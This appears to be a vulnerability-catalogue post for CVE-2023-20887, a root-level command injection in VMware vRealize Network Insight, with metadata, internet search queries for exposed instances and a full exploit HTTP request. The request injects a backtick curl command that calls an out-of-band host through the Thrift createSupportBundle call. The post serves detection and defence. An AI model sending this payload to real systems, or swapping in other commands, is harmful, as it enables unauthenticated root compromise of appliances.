---
layout: post
cve_id: CVE-2023-20887
title: VMware VRealize Network Insight - Remote Code Execution
pcap: true
pcap_path: /pcaps/2023/CVE-2023-20887.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-20887.yaml
snort2_rule: N/A
snort3_rule: N/A
author: sinsinology
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary code on the affected system.

  '
remediation: 'Apply the latest security patches provided by VMware to mitigate this
  vulnerability.

  '
reference:
- https://www.vmware.com/security/advisories/VMSA-2023-0012.html
- https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/
- https://github.com/sinsinology/CVE-2023-20887
- http://packetstormsecurity.com/files/173761/VMWare-Aria-Operations-For-Networks-Remote-Command-Execution.html
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-20887
  cwe-id: CWE-77
  epss-score: 0.94393
  epss-percentile: 0.9997
  cpe: cpe:2.3:a:vmware:vrealize_network_insight:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: vmware
  product: vrealize_network_insight
  shodan-query:
  - title:"VMware vRealize Network Insight"
  - http.title:"vmware vrealize network insight"
  - http.title:"vmware aria operations"
  fofa-query:
  - title="VMware vRealize Network Insight"
  - title="vmware aria operations"
  - title="vmware vrealize network insight"
  google-query:
  - intitle:"vmware aria operations"
  - intitle:"vmware vrealize network insight"
tags:
- cve2023
- cve
- packetstorm
- vmware
- rce
- msf
- vrealize
- insight
- oast
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
VMWare Aria Operations for Networks (vRealize Network Insight) is vulnerable to command injection when accepting user input through the Apache Thrift RPC interface. This vulnerability allows a remote unauthenticated attacker to execute arbitrary commands on the underlying operating system as the root user. The RPC interface is protected by a reverse proxy which can be bypassed. VMware has evaluated the severity of this issue to be in the Critical severity range with a maximum CVSSv3 base score of 9.8. A malicious actor can get remote code execution in the context of 'root' on the appliance. VMWare 6.x version are
 vulnerable.


## üåê HTTP Request
```nohighlight
POST /saas./resttosaasservlet HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Safari/537.36
Connection: close
Content-Length: 172
Content-Type: application/x-thrift
Accept-Encoding: gzip
[1,"createSupportBundle",1,0,{"1":{"str":"1111"},"2":{"str":"`curl d5ir0v9le0o12f6ui070xt8oproqsdiy9.oast.site`"},"3":{"str":"value3"},"4":{"lst":["str",2,"AAAA","BBBB"]}}]
```

